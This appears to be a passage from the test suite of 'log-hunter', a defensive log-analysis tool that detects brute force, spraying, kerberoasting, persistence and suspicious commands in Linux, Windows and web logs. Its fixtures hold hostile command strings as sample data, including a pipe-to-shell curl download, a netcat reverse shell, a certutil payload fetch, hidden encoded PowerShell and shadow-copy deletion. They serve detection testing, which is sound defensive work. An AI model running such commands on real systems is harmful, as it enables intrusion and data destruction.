    assert.equal(get(analyzeText("Oct 13 10:00:00 h sshd[1]: Accepted password for root from 10.0.0.5 port 1 ssh2", { assumeYear: 2026 }), "linux.root_login").severity, "medium");
    const r2 = analyzeText(["Oct 13 10:00:00 h useradd[1]: new user: name=backup2, UID=1005, GID=1005, home=/home/backup2, shell=/bin/bash", "Oct 13 10:00:01 h usermod[2]: add 'backup2' to group 'sudo'", "Oct 13 10:00:02 h sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/visudo"].join("\n"), { assumeYear: 2026 });
    assert.ok(has(r2, "linux.new_user")); assert.ok(has(r2, "linux.priv_group")); assert.ok(has(r2, "linux.sudoers"));
    assert.equal(get(r2, "linux.priv_group").technique, "T1548.003");
    assert.equal(get(analyzeText("Oct 13 10:00:01 h usermod[2]: add 'backup2' to group 'audio'", { assumeYear: 2026 }), "linux.new_user").severity, "low");
  });
  test("suspicious sudo commands vs routine admin commands", () => {
    const sudo = (c) => `Oct 13 10:00:00 h sudo:     bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=${c}`;
    for (const c of ["/usr/bin/curl -s http://203.0.113.1/s.sh | sh", "/bin/chmod +x /tmp/x", "/usr/bin/nc 203.0.113.1 4444 -e /bin/sh", "/usr/bin/base64 -d /tmp/p", "/bin/bash", "/usr/bin/python3 -c import os"])
      assert.ok(has(analyzeText(sudo(c), { assumeYear: 2026 }), "linux.sudo_shell"), c);
    for (const c of ["/usr/bin/systemctl restart nginx", "/usr/bin/apt-get update", "/usr/bin/tail -f /var/log/syslog", "/usr/bin/vim /etc/nginx/nginx.conf"])
      assert.notOk(has(analyzeText(sudo(c), { assumeYear: 2026 }), "linux.sudo_shell"), c);
    assert.ok(has(analyzeText("Oct 13 10:00:00 h sudo:     bob : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/ls", { assumeYear: 2026 }), "linux.sudo_fail"));
    assert.ok(has(analyzeText("Oct 13 10:00:00 h sudo:     bob : user NOT in sudoers ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/ls", { assumeYear: 2026 }), "linux.sudo_fail"));
  });
  test("cron/systemd persistence and break-in warnings", () => {
    const r = analyzeText(["2026-10-13T03:16:30+0000 h crontab[1]: (root) REPLACE (root)", "Oct 13 03:16:31 h systemd[1]: Created symlink /etc/systemd/system/multi-user.target.wants/upd.service -> /etc/systemd/system/upd.service.", "Oct 13 03:17:00 h sshd[2]: reverse mapping checking getaddrinfo for x [198.51.100.45] failed - POSSIBLE BREAK-IN ATTEMPT!"].join("\n"), { assumeYear: 2026 });
    assert.equal(r.findings.filter((f) => f.det === "linux.persist").length, 2);
    assert.equal(get(r, "linux.breakin").severity, "low"); assert.equal(get(r, "linux.breakin").ip, "198.51.100.45");
    assert.notOk(has(analyzeText("Oct 13 03:16:30 h crontab[1]: (root) LIST (root)", { assumeYear: 2026 }), "linux.persist"));
  });
});

// ---------------------------------------------------------------------------
group("log-hunter: windows detections", () => {
  const fails = (n, ip, userFn, sub = "0xc000006a") => Array.from({ length: n }, (_, i) => winJson(4625, `2026-10-13T10:00:${pad(i)}Z`, { TargetUserName: userFn(i), IpAddress: ip, LogonType: 3, Status: "0xc000006d", SubStatus: sub }));
  test("4625 burst at threshold; not at threshold-1; internal source is medium", () => {
    assert.ok(has(analyzeText(fails(10, "203.0.113.9", () => "jsmith").join("\n"), { winFailN: 10 }), "win.fail_burst"));
    assert.notOk(has(analyzeText(fails(9, "203.0.113.9", () => "jsmith").join("\n"), { winFailN: 10 }), "win.fail_burst"));
    assert.equal(get(analyzeText(fails(10, "10.0.0.9", () => "jsmith").join("\n"), { winFailN: 10 }), "win.fail_burst").severity, "medium");
    const f = get(analyzeText(fails(10, "203.0.113.9", () => "jsmith").join("\n")), "win.fail_burst");
    assert.ok(/wrong password/.test(f.detail), "sub-status decoded: " + f.detail);
  });
  test("password spraying (many accounts) and enumeration (0xC0000064)", () => {
    const r = analyzeText(fails(5, "203.0.113.9", (i) => "user" + i).join("\n"), { sprayUsersN: 5, winFailN: 99 });
    assert.ok(has(r, "win.spray")); assert.equal(get(r, "win.spray").technique, "T1110.003");
    assert.notOk(has(r, "win.enum"), "wrong-password failures are not enumeration");
    assert.ok(has(analyzeText(fails(5, "203.0.113.9", (i) => "ghost" + i, "0xc0000064").join("\n"), { sprayUsersN: 5, winFailN: 99 }), "win.enum"));
    assert.notOk(has(analyzeText(fails(4, "203.0.113.9", (i) => "user" + i).join("\n"), { sprayUsersN: 5, winFailN: 99 }), "win.spray"));
  });
  test("lockout spike threshold", () => {
    const lo = (n) => Array.from({ length: n }, (_, i) => winJson(4740, `2026-10-13T10:0${i}:00Z`, { TargetUserName: "u" + i, TargetDomainName: "WS-044" }));
    assert.ok(has(analyzeText(lo(3).join("\n"), { lockoutN: 3 }), "win.lockout"));
    assert.notOk(has(analyzeText(lo(2).join("\n"), { lockoutN: 3 }), "win.lockout"));
  });
  test("RDP type 10 from external is high; internal RDP and type 2 are not flagged", () => {
    assert.ok(has(analyzeText(winJson(4624, "2026-10-13T10:00:00Z", { TargetUserName: "mlee", LogonType: 10, IpAddress: "203.0.113.9" })), "win.rdp_external"));
    assert.notOk(has(analyzeText(winJson(4624, "2026-10-13T10:00:00Z", { TargetUserName: "mlee", LogonType: 10, IpAddress: "10.0.0.9" })), "win.rdp_external"));
    assert.notOk(has(analyzeText(winJson(4624, "2026-10-13T10:00:00Z", { TargetUserName: "mlee", LogonType: 2, IpAddress: "203.0.113.9" })), "win.rdp_external"));
    assert.ok(has(analyzeText(winJson(4624, "2026-10-13T10:00:00Z", { TargetUserName: "mlee", LogonType: 10, IpAddress: "10.0.0.9" }), { internalCidrs: ["192.168.0.0/16"] }), "win.rdp_external"), "custom CIDRs make 10/8 external");
  });
  test("type-3 fan-out across distinct computers", () => {
    const L = Array.from({ length: 5 }, (_, i) => winJson(4624, `2026-10-13T10:0${i}:00Z`, { TargetUserName: "mlee", LogonType: 3, IpAddress: "10.0.0.44" }, "SRV0" + i));
    const r = analyzeText(L.join("\n"), { fanoutHostsN: 5 });
    assert.ok(has(r, "win.fanout")); assert.equal(get(r, "win.fanout").technique, "T1021.002");
    const same = Array.from({ length: 5 }, (_, i) => winJson(4624, `2026-10-13T10:0${i}:00Z`, { TargetUserName: "mlee", LogonType: 3, IpAddress: "10.0.0.44" }, "SRV01"));
    assert.notOk(has(analyzeText(same.join("\n"), { fanoutHostsN: 5 }), "win.fanout"), "same computer repeatedly is not fan-out");
  });
  test("new user then privileged group add within window is critical; outside window is not chained", () => {
    const mk = (gap) => [winJson(4720, "2026-10-13T10:00:00Z", { TargetUserName: "svc_backup2", SubjectUserName: "jdoe" }), winJson(4732, `2026-10-13T${pad(10 + Math.floor(gap / 60))}:${pad(gap % 60)}:00Z`, { MemberName: "CN=svc_backup2,CN=Users,DC=corp", TargetUserName: "Administrators", SubjectUserName: "jdoe" })].join("\n");
    const r = analyzeText(mk(5), { newUserAdminWindowMin: 60 });
    assert.ok(has(r, "win.new_admin")); assert.equal(get(r, "win.new_admin").severity, "critical"); assert.equal(get(r, "win.new_admin").user, "svc_backup2");
    assert.ok(has(r, "win.priv_group")); assert.ok(has(r, "win.new_user"));
    const r2 = analyzeText(mk(120), { newUserAdminWindowMin: 60 });
    assert.notOk(has(r2, "win.new_admin")); assert.ok(has(r2, "win.priv_group"), "group add alone still high");
    assert.notOk(has(analyzeText(winJson(4732, "2026-10-13T10:00:00Z", { MemberName: "CN=bob", TargetUserName: "Remote Management Users" })), "win.priv_group"), "non-privileged group not flagged");
  });
  test("1102 log cleared is critical; 4698/7045 persistence with suspicious paths raised to high", () => {
    const r = analyzeText([
      winJson(1102, "2026-10-13T10:00:00Z", { SubjectUserName: "jdoe" }, "WS1"),
      winJson(4698, "2026-10-13T10:01:00Z", { TaskName: "\\Upd", TaskContent: "<Command>powershell.exe</Command><Arguments>-nop -w hidden -enc AAAA</Arguments>", SubjectUserName: "jdoe" }, "WS1"),
      winJson(7045, "2026-10-13T10:02:00Z", { ServiceName: "svc", ImagePath: "C:\\Users\\Public\\x.exe" }, "WS1"),
      winJson(7045, "2026-10-13T10:03:00Z", { ServiceName: "GoogleUpdater", ImagePath: "C:\\Program Files\\Google\\Update\\GoogleUpdate.exe" }, "WS1"),
    ].join("\n"));
    assert.equal(get(r, "win.log_cleared").severity, "critical"); assert.equal(get(r, "win.log_cleared").technique, "T1070.001");
    assert.equal(get(r, "win.sched_task").severity, "high");
    const svcs = r.findings.filter((f) => f.det === "win.new_service");
    assert.equal(svcs.length, 2);
    assert.equal(svcs.find((f) => /svc on/.test(f.detail)).severity, "high");
    assert.equal(svcs.find((f) => /GoogleUpdater/.test(f.detail)).severity, "medium");
  });
  test("4648 explicit creds: severity rises with distinct targets", () => {
    const one = winJson(4648, "2026-10-13T10:00:00Z", { SubjectUserName: "mlee", TargetUserName: "administrator", TargetServerName: "FS01" });
    assert.equal(get(analyzeText(one), "win.explicit_creds").severity, "medium");
    const many = Array.from({ length: 5 }, (_, i) => winJson(4648, `2026-10-13T10:0${i}:00Z`, { SubjectUserName: "mlee", TargetUserName: "administrator", TargetServerName: "FS0" + i })).join("\n");
    assert.equal(get(analyzeText(many, { explicitCredTargetsN: 5 }), "win.explicit_creds").severity, "high");
  });
  test("4672 for non-admin-named account only; admin pattern configurable", () => {
    assert.ok(has(analyzeText(winJson(4672, "2026-10-13T10:00:00Z", { SubjectUserName: "mlee" })), "win.special_priv"));
    assert.notOk(has(analyzeText(winJson(4672, "2026-10-13T10:00:00Z", { SubjectUserName: "administrator" })), "win.special_priv"));
    assert.notOk(has(analyzeText(winJson(4672, "2026-10-13T10:00:00Z", { SubjectUserName: "DC01$" })), "win.special_priv"));
    assert.notOk(has(analyzeText(winJson(4672, "2026-10-13T10:00:00Z", { SubjectUserName: "mlee" }), { adminNamePattern: "^mlee$" }), "win.special_priv"));
  });
  test("kerberoasting: RC4 tickets for user service accounts; AES, krbtgt and computer accounts ignored", () => {
    const k = (svc, enc) => winJson(4769, "2026-10-13T10:00:00Z", { TargetUserName: "mlee@CORP", ServiceName: svc, TicketEncryptionType: enc, Status: "0x0" });
    assert.ok(has(analyzeText(k("svc_sql", "0x17")), "win.kerberoast"));
    assert.notOk(has(analyzeText(k("svc_sql", "0x12")), "win.kerberoast"));
    assert.notOk(has(analyzeText(k("krbtgt", "0x17")), "win.kerberoast"));
    assert.notOk(has(analyzeText(k("SRV01$", "0x17")), "win.kerberoast"));
    const many = ["a", "b", "c", "d", "e"].map((s) => k("svc_" + s, "0x17")).join("\n");
    assert.equal(get(analyzeText(many, { kerberoastN: 5 }), "win.kerberoast").severity, "high");
  });
  test("pass-the-hash hints: LogonType 9 and NTLM 4776 bursts", () => {
    assert.ok(has(analyzeText(winJson(4624, "2026-10-13T10:00:00Z", { TargetUserName: "mlee", LogonType: 9, IpAddress: "10.0.0.44" })), "win.pth"));
    const ntlm = (n) => Array.from({ length: n }, (_, i) => winJson(4776, `2026-10-13T10:00:${pad(i)}Z`, { TargetUserName: "u" + (i % 3), Workstation: "WS-044", Status: "0x0" })).join("\n");
    assert.ok(has(analyzeText(ntlm(20), { ntlmBurstN: 20 }), "win.pth"));
    assert.notOk(has(analyzeText(ntlm(19), { ntlmBurstN: 20 }), "win.pth"));
    assert.equal(get(analyzeText(ntlm(20), { ntlmBurstN: 20 }), "win.pth").confidence, "medium");
  });
  test("4688 suspicious process creation vs normal", () => {
    const p = (cl) => winJson(4688, "2026-10-13T10:00:00Z", { SubjectUserName: "mlee", NewProcessName: "C:\\Windows\\System32\\cmd.exe", CommandLine: cl });
    assert.ok(has(analyzeText(p("powershell -nop -w hidden -enc SQBFAFgA")), "win.proc_suspicious"));
    assert.ok(has(analyzeText(p("vssadmin delete shadows /all /quiet")), "win.proc_suspicious"));
    assert.ok(has(analyzeText(p("certutil -urlcache -split -f http://203.0.113.1/a.exe")), "win.proc_suspicious"));
    assert.notOk(has(analyzeText(p("notepad.exe C:\\Users\\mlee\\notes.txt")), "win.proc_suspicious"));
  });
  test("off-hours admin logon honours business hours, offset and weekend flag", () => {
    const e = winJson(4624, "2026-10-13T22:00:00Z", { TargetUserName: "administrator", LogonType: 2, IpAddress: "10.0.0.1" });
    assert.ok(has(analyzeText(e, { businessStart: 8, businessEnd: 18, utcOffset: 0 }), "offhours.admin"));
    assert.notOk(has(analyzeText(e, { businessStart: 8, businessEnd: 18, utcOffset: -8 }), "offhours.admin"), "14:00 local in UTC-8");
    assert.notOk(has(analyzeText(winJson(4624, "2026-10-13T22:00:00Z", { TargetUserName: "mlee", LogonType: 2 })), "offhours.admin"), "non-admin ignored");
    const sat = winJson(4624, "2026-10-17T12:00:00Z", { TargetUserName: "administrator", LogonType: 2 });
    assert.ok(has(analyzeText(sat), "offhours.admin"));
    assert.notOk(has(analyzeText(sat, { weekendOffHours: false }), "offhours.admin"));
  });
});

// ---------------------------------------------------------------------------
group("log-hunter: report, dossier, exports", () => {
  const mixed = [
    clf("198.51.100.23", "09:14:01", "GET", "/p?id=1%20UNION%20SELECT%201", 200, "sqlmap/1.8"),
    clf("203.0.113.5", "09:14:02", "GET", "/", 200, "Mozilla/5.0"),
    "Oct 13 09:20:00 web-01 sshd[1]: Accepted publickey for deploy from 10.0.0.15 port 1 ssh2",
    winJson(1102, "2026-10-13T11:00:00Z", { SubjectUserName: "jdoe" }, "WS1"),
  ].join("\n");
  test("mixed sources in one paste; stats, timeline buckets and severity counts", () => {
    const r = analyzeText(mixed, { assumeYear: 2026 }, "mixed.log");
    assert.deepEqual(r.stats.sources, { web: 2, linux: 1, windows: 1 });
    assert.equal(r.stats.uniqueIps, 3); assert.equal(r.stats.externalIps, 2); assert.equal(r.stats.internalIps, 1);
    assert.equal(r.timeline.length, 2); assert.equal(r.timeline[0].total, 3); assert.equal(r.timeline[0].flagged, 1); assert.equal(r.timeline[1].windows, 1);
    assert.equal(r.bySeverity.critical, 1);
    assert.equal(r.findings[0].det, "win.log_cleared", "sorted by severity first");
    assert.ok(/Parsed 4 events/.test(r.summary) && /T1070\.001/.test(r.summary), r.summary);
  });
  test("per-IP dossier links findings and classifies scope", () => {
    const r = analyzeText(mixed, { assumeYear: 2026 });
    const bad = r.ips.find((d) => d.ip === "198.51.100.23");
    assert.ok(bad && !bad.internal && bad.count === 1 && bad.findings.length >= 1 && bad.maxSeverity);
    assert.equal(r.ips[0].ip, "198.51.100.23", "worst IP first");
    assert.ok(r.ips.find((d) => d.ip === "10.0.0.15").internal);
    assert.equal(bad.topUa[0].value, "sqlmap/1.8"); assert.equal(bad.topPaths[0].value, "/p");
  });
  test("IOC list excludes internal IPs and low findings", () => {
    const r = analyzeText(mixed + "\n" + Array.from({ length: 10 }, (_, i) => sshFail(i, "10.0.0.9", "root")).join("\n"), { assumeYear: 2026 });
    assert.deepEqual(r.iocs.external, ["198.51.100.23"]);
    assert.deepEqual(r.iocs.internal, ["10.0.0.9"]);
    const txt = iocText(r);
    assert.ok(txt.trim().endsWith("198.51.100.23") && !txt.includes("10.0.0.9"));
  });
  test("CSV and JSON exports are well-formed", () => {
    const r = analyzeText(mixed, { assumeYear: 2026 });
    const csv = findingsToCsv(r.findings);
    assert.equal(csv.split("\n")[0].split(",").length, 18);
    assert.equal(csv.trim().split("\n").length, r.findings.length + 1);
    assert.ok(csv.includes('"T1070.001"'));
    const j = JSON.parse(reportToJson(r));
    assert.equal(j.findings.length, r.findings.length); assert.ok(j.summary && j.settings.bruteN === 10);
  });
  test("empty input yields an honest summary and no findings", () => {
    const r = analyzeText("");
    assert.equal(r.findings.length, 0); assert.ok(/No detection fired/.test(r.summary));
  });
  test("deterministic: same input gives identical findings", () => {
    const a = analyzeText(mixed, { assumeYear: 2026 }), b = analyzeText(mixed, { assumeYear: 2026 });
    assert.deepEqual(a.findings.map((f) => [f.det, f.severity, f.count, f.ip]), b.findings.map((f) => [f.det, f.severity, f.count, f.ip]));
  });
  test("string settings from the UI are normalised (CIDRs, login paths, numbers)", () => {
    const r = analyzeText(winJson(4624, "2026-10-13T10:00:00Z", { TargetUserName: "mlee", LogonType: 10, IpAddress: "203.0.113.9" }), { internalCidrs: "203.0.113.0/24, 10.0.0.0/8", bruteN: "7" });
    assert.notOk(has(r, "win.rdp_external")); assert.equal(r.settings.bruteN, 7); assert.deepEqual(r.settings.internalCidrs, ["203.0.113.0/24", "10.0.0.0/8"]);
  });
  const brute = Array.from({ length: 12 }, (_, i) => sshFail(i, "198.51.100.40", "admin")).join("\n");
  test("sink: required fields, normalised severity, stable ids/titles across runs, sample tagging", () => {
    const a = toSinkFindings(analyzeText(mixed + "\n" + brute, { assumeYear: 2026 })), b = toSinkFindings(analyzeText(mixed + "\n" + brute, { assumeYear: 2026 }));
    const { items } = checkSinkFindings("loghunt", a, b, { minFindings: 3 });
    assert.ok(items.some((i) => i.type === "IP" && i.name === "198.51.100.40"));
    assert.ok(items.some((i) => i.type === "CONTROL" && i.name === "MITRE T1070.001"));
    assert.ok(a.every((f) => !/^F-\d+$/.test(f.id)), "positional ids never reach the graph");
  });
  test("sink: ids survive a re-hunt that adds findings (F-nnn shifts, sink ids do not)", () => {
    const r1 = analyzeText(mixed, { assumeYear: 2026 }), r2 = analyzeText(brute + "\n" + mixed, { assumeYear: 2026 });
    const ids2 = new Set(toSinkFindings(r2).map((f) => f.id + "|" + f.title));
    for (const f of toSinkFindings(r1)) assert.ok(ids2.has(f.id + "|" + f.title), "lost " + f.id);
  });
  test("200k-line input parses in bounded time", () => {
    const L = new Array(200000);
    for (let i = 0; i < L.length; i++) L[i] = clf("203.0.113." + (i % 200), `${pad(Math.floor(i / 10000))}:${pad(Math.floor(i / 170) % 60)}:${pad(i % 60)}`, "GET", "/p/" + (i % 500), i % 50 === 0 ? 404 : 200);
    const t0 = Date.now();
    const r = analyzeText(L.join("\n"));
    const ms = Date.now() - t0;
    assert.equal(r.stats.events, 200000);
    assert.ok(ms < 20000, "took " + ms + " ms");
  });
});

group("log-hunter: a prototype-named file can't crash or pollute", () => {
  test("parseText with a file named __proto__ parses normally, no Object.prototype pollution", () => {
    const line = '127.0.0.1 - - [07/Oct/2026:14:00:00 +0000] "GET /x HTTP/1.1" 200 12';
    const r = parseText(line, "__proto__");
    assert.ok(r.events.length >= 1, "the line is still parsed");
    assert.equal(({}).lines, undefined, "Object.prototype was not polluted");
  });
});

group("log-hunter: RFC 5424 syslog", () => {
  test("header with PROCID/MSGID/structured data is parsed, sshd message classified", () => {
    const r = parseText([
      "<34>1 2026-10-11T22:14:15.003Z web1 sshd 123 - - Failed password for root from 2001:db8::5 port 22 ssh2",
      '<34>1 2026-10-11T22:14:16Z web1 sshd 123 ID47 [ex@1 a="x\\]y"] Accepted password for bob from 10.0.0.1 port 22 ssh2',
    ].join("\n"), "auth.log");
    const [a, b] = r.events;
    assert.equal(a.action, "auth_fail"); assert.equal(a.user, "root"); assert.equal(a.host, "web1");
    assert.equal(a.ts, Date.UTC(2026, 9, 11, 22, 14, 15, 3));
    assert.equal(b.action, "auth_ok"); assert.equal(b.user, "bob"); assert.equal(b.ip, "10.0.0.1");
  });
});
